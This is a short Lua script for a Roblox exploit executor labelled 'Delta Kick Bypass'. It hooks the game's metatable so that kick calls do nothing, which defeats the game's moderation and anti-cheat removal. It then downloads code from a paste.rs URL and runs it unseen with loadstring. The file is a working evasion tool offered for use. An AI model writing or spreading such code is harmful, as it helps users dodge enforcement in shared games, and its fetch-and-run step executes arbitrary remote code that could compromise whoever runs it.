-- Delta Kick Bypass
local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldNamecall = mt.__namecall
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if tostring(method):lower() == "kick" then
        return nil
    end
    return oldNamecall(self, ...)
end)
print("✅ Bypass loaded")

-- Load your main script
local success, err = pcall(function()
    loadstring(game:HttpGet("https://paste.rs/EI1h3", true))()
end)
if not success then
    warn("Script failed:", err)
end
